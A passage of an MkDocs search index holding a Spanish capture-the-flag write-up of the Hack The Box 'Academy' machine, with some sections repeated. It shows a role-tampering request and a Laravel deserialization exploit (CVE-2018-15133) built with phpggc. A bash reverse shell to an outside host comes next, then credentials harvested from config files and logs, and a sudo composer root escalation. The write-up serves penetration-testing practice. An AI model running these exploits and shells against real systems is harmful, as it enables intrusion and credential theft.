{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"X4t4x Pentesting: Writeups y metodolog\u00edas empleadas en m\u00e1quinas de HTB Hack the Box Webpage :: Mkdocs :: Installation: pip install mkdocs-material Desarrollo: mkdocs new nuevoproyecto mkdocs serve mkdocs build mkdocs build -f mkdocs_pdf.yml Plugins: pip install mkdocs-with-pdf","title":"Introduci\u00f3n"},{"location":"#x4t4x-pentesting","text":"Writeups y metodolog\u00edas empleadas en m\u00e1quinas de HTB Hack the Box Webpage","title":"X4t4x Pentesting:"},{"location":"#mkdocs","text":"Installation: pip install mkdocs-material Desarrollo: mkdocs new nuevoproyecto mkdocs serve mkdocs build mkdocs build -f mkdocs_pdf.yml Plugins: pip install mkdocs-with-pdf","title":":: Mkdocs ::"},{"location":"maquinas/linux/academy/","text":"Academy HTB Recon Se comprueba que la m\u00e1quina est\u00e1 activa: ping 10.10.10.215 Enum Se realiza un scan de los 65535 puertos TCP: nmap -sS -Pn -n --open --min-rate 5000 -p- -vvv -oG allPorts 10.10.10.215 Se realiza un scan de los puertos abiertos: nmap -sC -sV -p22,80,33060 10.10.10.215 -oN openPorts PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 c0:90:a3:d8:35:25:6f:fa:33:06:cf:80:13:a0:a5:53 (RSA) | 256 2a:d5:4b:d0:46:f0:ed:c9:3c:8d:f6:5d:ab:ae:77:96 (ECDSA) |_ 256 e1:64:14:c3:cc:51:b2:3b:a6:28:a7:b1:ae:5f:45:35 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-title: Did not follow redirect to http://academy.htb/ |_http-server-header: Apache/2.4.41 (Ubuntu) 33060/tcp open mysqlx? | fingerprint-strings: | DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: | Invalid message\" |_ HY000 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port33060-TCP:V=7.92%I=7%D=8/5%Time=62EC57E3%P=x86_64-pc-linux-gnu%r(NU SF:LL,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(GenericLines,9,\"\\x05\\0\\0\\0\\x0b\\x SF:08\\x05\\x1a\\0\")%r(GetRequest,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(HTTPOpt SF:ions,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(RTSPRequest,9,\"\\x05\\0\\0\\0\\x0b\\ SF:x08\\x05\\x1a\\0\")%r(RPCCheck,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(DNSVersi SF:onBindReqTCP,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(DNSStatusRequestTCP,2B SF:,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\\x1e\\0\\0\\0\\x01\\x08\\x01\\x10\\x88'\\x1a\\x0fIn SF:valid\\x20message\\\"\\x05HY000\")%r(Help,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")% SF:r(SSLSessionReq,2B,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\\x1e\\0\\0\\0\\x01\\x08\\x01\\ SF:x10\\x88'\\x1a\\x0fInvalid\\x20message\\\"\\x05HY000\")%r(TerminalServerCookie, SF:9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(TLSSessionReq,2B,\"\\x05\\0\\0\\0\\x0b\\x0 SF:8\\x05\\x1a\\0\\x1e\\0\\0\\0\\x01\\x08\\x01\\x10\\x88'\\x1a\\x0fInvalid\\x20message\\\"\\ SF:x05HY000\")%r(Kerberos,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(SMBProgNeg,9, SF:\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(X11Probe,2B,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x SF:1a\\0\\x1e\\0\\0\\0\\x01\\x08\\x01\\x10\\x88'\\x1a\\x0fInvalid\\x20message\\\"\\x05HY00 SF:0\")%r(FourOhFourRequest,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(LPDString,9 SF:,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(LDAPSearchReq,2B,\"\\x05\\0\\0\\0\\x0b\\x08 SF:\\x05\\x1a\\0\\x1e\\0\\0\\0\\x01\\x08\\x01\\x10\\x88'\\x1a\\x0fInvalid\\x20message\\\"\\x SF:05HY000\")%r(LDAPBindReq,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(SIPOptions, SF:9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(LANDesk-RC,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x0 SF:5\\x1a\\0\")%r(TerminalServer,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(NCP,9,\"\\ SF:x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(NotesRPC,2B,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a SF:\\0\\x1e\\0\\0\\0\\x01\\x08\\x01\\x10\\x88'\\x1a\\x0fInvalid\\x20message\\\"\\x05HY000\" SF:)%r(JavaRMI,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(WMSRequest,9,\"\\x05\\0\\0\\ SF:0\\x0b\\x08\\x05\\x1a\\0\")%r(oracle-tns,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r( SF:ms-sql-s,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(afp,2B,\"\\x05\\0\\0\\0\\x0b\\x08 SF:\\x05\\x1a\\0\\x1e\\0\\0\\0\\x01\\x08\\x01\\x10\\x88'\\x1a\\x0fInvalid\\x20message\\\"\\x SF:05HY000\")%r(giop,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\"); Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Acceso a la web Accediendo a academy.htb/register.htb podemos registrarnos para acceder desde login.php Pero para acceder a admin.php se puede modificar el rol desde el registro usando burp: POST /register.php HTTP/1.1 Host: academy.htb User-Agent: Mozilla/4.77 en (X11; U; Linux 2.4.9 i686) Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 48 Origin: http://academy.htb DNT: 1 Connection: close Referer: http://academy.htb/register.php Cookie: PHPSESSID=60i29vhf1m8hmsgv3dgj8ba5bo Upgrade-Insecure-Requests: 1 Sec-GPC: 1 uid=usuarioX&password=passd123&confirm=passw123&roleid=1 Tras logar en admin.php esto nos lleva a la p\u00e1gina http://academy.htb/admin-page.php donde se descubre un nuevo subdominio: Explotation - Intrusion Tras acceder al subdominio se pueden ver errores de depuraci\u00f3n que indican que utiliza Laravel y nos filtra la key de la API: Link RCE Laravel Link serializador phpggc Generar payload serializado para Laravel en base64: ./phpggc Laravel/RCE3 system whoami -b Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6MTp7czo5OiIAKgBldmVudHMiO086Mzk6IklsbHVtaW5hdGVcTm90aWZpY2F0aW9uc1xDaGFubmVsTWFuYWdlciI6Mzp7czo2OiIAKgBhcHAiO3M6Njoid2hvYW1pIjtzOjE3OiIAKgBkZWZhdWx0Q2hhbm5lbCI7czoxOiJ4IjtzOjE3OiIAKgBjdXN0b21DcmVhdG9ycyI7YToxOntzOjE6IngiO3M6Njoic3lzdGVtIjt9fX0= Utilizar la key filtrada y el payload para generar un token para inyectarlo posteriormente: ./cve-2018-15133.php dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0= Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGl......YToxOntzOjE6IngiO3M6Njoic3lzdGVtIjt9fX0= PoC for Unserialize vulnerability in Laravel <= 5.6.29 (CVE-2018-15133) by @kozmic HTTP header for POST request: X-XSRF-TOKEN: eyJpdiI6ImpxNmxRZlV6Z0szekRVOE4xcVJwMFE9PSIsInZhbHVlIjoiSGZGXC9vVk1rY1M2dUFLdTVoNmpwOFNSZkpRQk1jTytCNjN6SUJUNFwvMEpJOFRcL2RYTVBOb1VoODl2VlBWOEl3dVJqb2hqaDdLUU5uSU9peGx5QWh3SEhIT29KaUVnK1Y0dDJBdm9vdkk4a3ozRjFJeVRMeDdXUkFyMkxmaDZTbXhLbWpBMGpON25Wb0RKTzVGWUpSRnNHbWR1K2xmR3l3Q1QweEc4Sm5oVkFaMCtSdENsSE9taVd3SmJuUnh6d1NsT1JzVWZKWHR3M0RJVjNnc2Juc25DS0pIOWx2blgxVFlxd0hCR3VaSXJOODc3ZTE5b1M2alcyK1J2SU9MWVh5VDBhbzgzRWg5XC9kbHc0ZTZOekdwVHRJSmQ4TUFRZXdHV2J0ZFVvcTN5WWtubTI2c0g2eFg5aTVvQVArbmhOSnp3IiwibWFjIjoiOWE0OTM4ODhkM2RlODgzMjljNjA0YWNlMjAxYjgyN2Q2ZjRlNjZjZmU1MmEyMmQxYzY4YjM2YjExODYwNzg3NiJ9 Inyecci\u00f3n del token con Curl: curl -s http://dev-staging-01.academy.htb -X POST -H 'X-XSRF-TOKEN: eyJpdiI6ImtoRnBzVDhVcHIrS......MjNlMTE2ZThkYWE3MGYwMWJlZmY1M2MxMDEzNzlmOTNlYTgyNzBmIn0='| head -n 1 www-data Se lanza una shell reversa y se obtiene acceso como www-data: ./phpggc laravel/rce3 system \"bash -c 'bash -i >& /dev/tcp/10.10.14.11/443 0>&1'\" -b Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6MTp7czo5OiIAKgBldmVudHMiO086Mzk6IklsbHVtaW5hdGVcTm90aWZpY2F0aW9uc1xDaGFubmVsTWFuYWdlciI6Mzp7czo2OiIAKgBhcHAiO3M6NTA6ImJhc2ggLWMgJ2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTEvNDQzIDA+JjEnIjtzOjE3OiIAKgBkZWZhdWx0Q2hhbm5lbCI7czoxOiJ4IjtzOjE3OiIAKgBjdXN0b21DcmVhdG9ycyI7YToxOntzOjE6IngiO3M6Njoic3lzdGVtIjt9fX0= ./cve-2018-15133.php dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0= Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6MTp7czo5OiIAKgBldmVudHMiO086Mzk6IklsbHVtaW5hdGVcTm90aWZpY2F0aW9uc1xDaGFubmVsTWFuYWdlciI6Mzp7czo2OiIAKgBhcHAiO3M6NTA6ImJhc2ggLWMgJ2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTEvNDQzIDA+JjEnIjtzOjE3OiIAKgBkZWZhdWx0Q2hhbm5lbCI7czoxOiJ4IjtzOjE3OiIAKgBjdXN0b21DcmVhdG9ycyI7YToxOntzOjE6IngiO3M6Njoic3lzdGVtIjt9fX0= PoC for Unserialize vulnerability in Laravel <= 5.6.29 (CVE-2018-15133) by @kozmic HTTP header for POST request: X-XSRF-TOKEN: eyJpdiI6IndKMW92NHM3MDFKbk9hd3l5Z0NxMVE9PSIsInZhbHVlIjoiK1NoVG5OTkVQSkxxV05hQmowRlRTVitzY0M0cWwxV0RJaXloVmJIR0dZanpoYTRROFNRZ01IeDRGdHdTQmpjelhucDlwekdzZVpzalNkUlpFekZkQkorcitYd2dTUmdxQXpsOU1USis5alhnd1hKcnZxRFVmaGtocmpvYmJ0bHdQNGtrRmNKU0lIdTcxUnZHZnRwblZSWDYyUk1EczVCdXJiSmdmYitCUzVkak5GV0lzRXdRYVpjYjhMRFpSMzZHdUwyQitZK0xTMDNxSFwvdE9KdWFCNFY0Z2tndnNEOVFueSs3OGFLXC9xK2VPSFwvMjRNcmlNRnpDMFBTR09LWmZ3aG9qZ0cxYXJlN3pMazhYdGxWVG1lZExtZzQydW5wdVNzNk9qTEFobFNzd01zWStLK01oeWFRK2ZwVzhhTEJGVlBrZ2FOZWlhZTJ5OGFuVzdpZ3FJb1padU5IZmNJWnZiQm9HMDgzZEN2RUlQRlpNSkY1K1k5OW9BNUU2OXFpUkl6IiwibWFjIjoiZTVjOTVlZmRlMDBhN2UxZjNhZDUwZGI2MDkxMzEyZDkyYjhiZGU0ZDBmZjViNzZhZTBiNTc3ZGJmMWE5NzEwOSJ9 curl -s http://dev-staging-01.academy.htb -X POST -H 'X-XSRF-TOKEN: eyJpdiI6IndKMW92NHM3MDFKbk9hd3l5Z0NxMVE9PSIsInZhbHVlIjoiK1NoVG5OTkVQSkxxV05hQmowRlRTVitzY0M0cWwxV0RJaXloVmJIR0dZanpoYTRROFNRZ01IeDRGdHdTQmpjelhucDlwekdzZVpzalNkUlpFekZkQkorcitYd2dTUmdxQXpsOU1USis5alhnd1hKcnZxRFVmaGtocmpvYmJ0bHdQNGtrRmNKU0lIdTcxUnZHZnRwblZSWDYyUk1EczVCdXJiSmdmYitCUzVkak5GV0lzRXdRYVpjYjhMRFpSMzZHdUwyQitZK0xTMDNxSFwvdE9KdWFCNFY0Z2tndnNEOVFueSs3OGFLXC9xK2VPSFwvMjRNcmlNRnpDMFBTR09LWmZ3aG9qZ0cxYXJlN3pMazhYdGxWVG1lZExtZzQydW5wdVNzNk9qTEFobFNzd01zWStLK01oeWFRK2ZwVzhhTEJGVlBrZ2FOZWlhZTJ5OGFuVzdpZ3FJb1padU5IZmNJWnZiQm9HMDgzZEN2RUlQRlpNSkY1K1k5OW9BNUU2OXFpUkl6IiwibWFjIjoiZTVjOTVlZmRlMDBhN2UxZjNhZDUwZGI2MDkxMzEyZDkyYjhiZGU0ZDBmZjViNzZhZTBiNTc3ZGJmMWE5NzEwOSJ9'| head -n 1 nc -lvnp 443 www-data@academy:/home$ whoami www-data Lateral Movement Se inspeccionan archivos y configuraciones: www-data@academy:/var/www/html/academy/public$ cat config.php <?php ini_set('display_errors', 1); ini_set('display_startup_errors', 1); error_reporting(E_ALL); $link=mysqli_connect('localhost','root','GkEWXn4h34g8qx9fZ1','academy'); ?> www-data@academy:/var/www/html/academy$ cat .env APP_NAME=Laravel APP_ENV=local APP_KEY=base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0= APP_DEBUG=false APP_URL=http://localhost LOG_CHANNEL=stack DB_CONNECTION=mysql DB_HOST=127.0.0.1 DB_PORT=3306 DB_DATABASE=academy DB_USERNAME=dev DB_PASSWORD=mySup3rP4s5w0rd!! Revisando la bbdd se encuentra un hash que podr\u00eda ser interesante, pero no sirve: mysql> select * from users; +----+-----------------------------------+----------------------------------+--------+---------------------+ | id | username | password | roleid | created_at | +----+-----------------------------------+----------------------------------+--------+---------------------+ | 5 | dev | a317f096a83915a3946fae7b7f035246 | 0 | 2020-08-10 23:36:25 | Se accede a otra sesi\u00f3n como cry0l1t3 con la password mySup3rP4s5w0rd!! y al estar en el grupo adm investigamos logs: cry0l1t3@academy:/var/log/audit$ grep -ri 'data=' | awk '{print $NF}'| awk 'FS=\"=\" {print $2}'| xxd -ps -r | less -S mrb3n_Ac@d3my! whoami exit /bin/bash -i Se accede como mrb3n con password mrb3n_Ac@d3my! : cry0l1t3@academy:/var/log/audit$ su mrb3n Password: $ whoami mrb3n Escalate Privileges (root) Desde el usuario mrb3n se encuentran comandos que se puede ejecutan con sudo, se aprovecha para escalar: mrb3n@academy:/var/www/html/htb-academy-dev-01$ sudo -l [sudo] password for mrb3n: Matching Defaults entries for mrb3n on academy: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User mrb3n may run the following commands on academy: (ALL) /usr/bin/composer mrb3n@academy:/var/www/html/htb-academy-dev-01$ sudo /usr/bin/composer exec chmod 4755 /bin/bash PHP Warning: PHP Startup: Unable to load dynamic library 'mysqli.so' (tried: /usr/lib/php/20190902/mysqli.so (/usr/lib/php/20190902/mysqli.so: undefined symbol: mysqlnd_global_stats), /usr/lib/php/20190902/mysqli.so.so (/usr/lib/php/20190902/mysqli.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0 PHP Warning: PHP Startup: Unable to load dynamic library 'pdo_mysql.so' (tried: /usr/lib/php/20190902/pdo_mysql.so (/usr/lib/php/20190902/pdo_mysql.so: undefined symbol: mysqlnd_allocator), /usr/lib/php/20190902/pdo_mysql.so.so (/usr/lib/php/20190902/pdo_mysql.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0 Do not run Composer as root/super user! See https://getcomposer.org/root for details mrb3n@academy:/var/www/html/htb-academy-dev-01$ /bin/bash -p bash-5.0# whoami oot bash-5.0# cat /root/root.txt **1d0792525f28ddb9a968d7996a285dfc**","title":"Academy"},{"location":"maquinas/linux/academy/#academy-htb","text":"","title":"Academy HTB"},{"location":"maquinas/linux/academy/#recon","text":"Se comprueba que la m\u00e1quina est\u00e1 activa: ping 10.10.10.215","title":"Recon"},{"location":"maquinas/linux/academy/#enum","text":"Se realiza un scan de los 65535 puertos TCP: nmap -sS -Pn -n --open --min-rate 5000 -p- -vvv -oG allPorts 10.10.10.215 Se realiza un scan de los puertos abiertos: nmap -sC -sV -p22,80,33060 10.10.10.215 -oN openPorts PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 c0:90:a3:d8:35:25:6f:fa:33:06:cf:80:13:a0:a5:53 (RSA) | 256 2a:d5:4b:d0:46:f0:ed:c9:3c:8d:f6:5d:ab:ae:77:96 (ECDSA) |_ 256 e1:64:14:c3:cc:51:b2:3b:a6:28:a7:b1:ae:5f:45:35 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-title: Did not follow redirect to http://academy.htb/ |_http-server-header: Apache/2.4.41 (Ubuntu) 33060/tcp open mysqlx? | fingerprint-strings: | DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: | Invalid message\" |_ HY000 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port33060-TCP:V=7.92%I=7%D=8/5%Time=62EC57E3%P=x86_64-pc-linux-gnu%r(NU SF:LL,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(GenericLines,9,\"\\x05\\0\\0\\0\\x0b\\x SF:08\\x05\\x1a\\0\")%r(GetRequest,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(HTTPOpt SF:ions,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(RTSPRequest,9,\"\\x05\\0\\0\\0\\x0b\\ SF:x08\\x05\\x1a\\0\")%r(RPCCheck,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(DNSVersi SF:onBindReqTCP,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(DNSStatusRequestTCP,2B SF:,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\\x1e\\0\\0\\0\\x01\\x08\\x01\\x10\\x88'\\x1a\\x0fIn SF:valid\\x20message\\\"\\x05HY000\")%r(Help,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")% SF:r(SSLSessionReq,2B,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\\x1e\\0\\0\\0\\x01\\x08\\x01\\ SF:x10\\x88'\\x1a\\x0fInvalid\\x20message\\\"\\x05HY000\")%r(TerminalServerCookie, SF:9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(TLSSessionReq,2B,\"\\x05\\0\\0\\0\\x0b\\x0 SF:8\\x05\\x1a\\0\\x1e\\0\\0\\0\\x01\\x08\\x01\\x10\\x88'\\x1a\\x0fInvalid\\x20message\\\"\\ SF:x05HY000\")%r(Kerberos,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(SMBProgNeg,9, SF:\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(X11Probe,2B,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x SF:1a\\0\\x1e\\0\\0\\0\\x01\\x08\\x01\\x10\\x88'\\x1a\\x0fInvalid\\x20message\\\"\\x05HY00 SF:0\")%r(FourOhFourRequest,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(LPDString,9 SF:,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(LDAPSearchReq,2B,\"\\x05\\0\\0\\0\\x0b\\x08 SF:\\x05\\x1a\\0\\x1e\\0\\0\\0\\x01\\x08\\x01\\x10\\x88'\\x1a\\x0fInvalid\\x20message\\\"\\x SF:05HY000\")%r(LDAPBindReq,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(SIPOptions, SF:9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(LANDesk-RC,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x0 SF:5\\x1a\\0\")%r(TerminalServer,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(NCP,9,\"\\ SF:x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(NotesRPC,2B,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a SF:\\0\\x1e\\0\\0\\0\\x01\\x08\\x01\\x10\\x88'\\x1a\\x0fInvalid\\x20message\\\"\\x05HY000\" SF:)%r(JavaRMI,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(WMSRequest,9,\"\\x05\\0\\0\\ SF:0\\x0b\\x08\\x05\\x1a\\0\")%r(oracle-tns,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r( SF:ms-sql-s,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(afp,2B,\"\\x05\\0\\0\\0\\x0b\\x08 SF:\\x05\\x1a\\0\\x1e\\0\\0\\0\\x01\\x08\\x01\\x10\\x88'\\x1a\\x0fInvalid\\x20message\\\"\\x SF:05HY000\")%r(giop,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\"); Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel","title":"Enum"},{"location":"maquinas/linux/academy/#acceso-a-la-web","text":"Accediendo a academy.htb/register.htb podemos registrarnos para acceder desde login.php Pero para acceder a admin.php se puede modificar el rol desde el registro usando burp: POST /register.php HTTP/1.1 Host: academy.htb User-Agent: Mozilla/4.77 en (X11; U; Linux 2.4.9 i686) Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 48 Origin: http://academy.htb DNT: 1 Connection: close Referer: http://academy.htb/register.php Cookie: PHPSESSID=60i29vhf1m8hmsgv3dgj8ba5bo Upgrade-Insecure-Requests: 1 Sec-GPC: 1 uid=usuarioX&password=passd123&confirm=passw123&roleid=1 Tras logar en admin.php esto nos lleva a la p\u00e1gina http://academy.htb/admin-page.php donde se descubre un nuevo subdominio:","title":"Acceso a la web"},{"location":"maquinas/linux/academy/#explotation-intrusion","text":"Tras acceder al subdominio se pueden ver errores de depuraci\u00f3n que indican que utiliza Laravel y nos filtra la key de la API: Link RCE Laravel Link serializador phpggc Generar payload serializado para Laravel en base64: ./phpggc Laravel/RCE3 system whoami -b Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6MTp7czo5OiIAKgBldmVudHMiO086Mzk6IklsbHVtaW5hdGVcTm90aWZpY2F0aW9uc1xDaGFubmVsTWFuYWdlciI6Mzp7czo2OiIAKgBhcHAiO3M6Njoid2hvYW1pIjtzOjE3OiIAKgBkZWZhdWx0Q2hhbm5lbCI7czoxOiJ4IjtzOjE3OiIAKgBjdXN0b21DcmVhdG9ycyI7YToxOntzOjE6IngiO3M6Njoic3lzdGVtIjt9fX0= Utilizar la key filtrada y el payload para generar un token para inyectarlo posteriormente: ./cve-2018-15133.php dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0= Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGl......YToxOntzOjE6IngiO3M6Njoic3lzdGVtIjt9fX0= PoC for Unserialize vulnerability in Laravel <= 5.6.29 (CVE-2018-15133) by @kozmic HTTP header for POST request: X-XSRF-TOKEN: eyJpdiI6ImpxNmxRZlV6Z0szekRVOE4xcVJwMFE9PSIsInZhbHVlIjoiSGZGXC9vVk1rY1M2dUFLdTVoNmpwOFNSZkpRQk1jTytCNjN6SUJUNFwvMEpJOFRcL2RYTVBOb1VoODl2VlBWOEl3dVJqb2hqaDdLUU5uSU9peGx5QWh3SEhIT29KaUVnK1Y0dDJBdm9vdkk4a3ozRjFJeVRMeDdXUkFyMkxmaDZTbXhLbWpBMGpON25Wb0RKTzVGWUpSRnNHbWR1K2xmR3l3Q1QweEc4Sm5oVkFaMCtSdENsSE9taVd3SmJuUnh6d1NsT1JzVWZKWHR3M0RJVjNnc2Juc25DS0pIOWx2blgxVFlxd0hCR3VaSXJOODc3ZTE5b1M2alcyK1J2SU9MWVh5VDBhbzgzRWg5XC9kbHc0ZTZOekdwVHRJSmQ4TUFRZXdHV2J0ZFVvcTN5WWtubTI2c0g2eFg5aTVvQVArbmhOSnp3IiwibWFjIjoiOWE0OTM4ODhkM2RlODgzMjljNjA0YWNlMjAxYjgyN2Q2ZjRlNjZjZmU1MmEyMmQxYzY4YjM2YjExODYwNzg3NiJ9 Inyecci\u00f3n del token con Curl: curl -s http://dev-staging-01.academy.htb -X POST -H 'X-XSRF-TOKEN: eyJpdiI6ImtoRnBzVDhVcHIrS......MjNlMTE2ZThkYWE3MGYwMWJlZmY1M2MxMDEzNzlmOTNlYTgyNzBmIn0='| head -n 1 www-data Se lanza una shell reversa y se obtiene acceso como www-data: ./phpggc laravel/rce3 system \"bash -c 'bash -i >& /dev/tcp/10.10.14.11/443 0>&1'\" -b Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6MTp7czo5OiIAKgBldmVudHMiO086Mzk6IklsbHVtaW5hdGVcTm90aWZpY2F0aW9uc1xDaGFubmVsTWFuYWdlciI6Mzp7czo2OiIAKgBhcHAiO3M6NTA6ImJhc2ggLWMgJ2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTEvNDQzIDA+JjEnIjtzOjE3OiIAKgBkZWZhdWx0Q2hhbm5lbCI7czoxOiJ4IjtzOjE3OiIAKgBjdXN0b21DcmVhdG9ycyI7YToxOntzOjE6IngiO3M6Njoic3lzdGVtIjt9fX0= ./cve-2018-15133.php dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0= Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6MTp7czo5OiIAKgBldmVudHMiO086Mzk6IklsbHVtaW5hdGVcTm90aWZpY2F0aW9uc1xDaGFubmVsTWFuYWdlciI6Mzp7czo2OiIAKgBhcHAiO3M6NTA6ImJhc2ggLWMgJ2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTEvNDQzIDA+JjEnIjtzOjE3OiIAKgBkZWZhdWx0Q2hhbm5lbCI7czoxOiJ4IjtzOjE3OiIAKgBjdXN0b21DcmVhdG9ycyI7YToxOntzOjE6IngiO3M6Njoic3lzdGVtIjt9fX0= PoC for Unserialize vulnerability in Laravel <= 5.6.29 (CVE-2018-15133) by @kozmic HTTP header for POST request: X-XSRF-TOKEN: 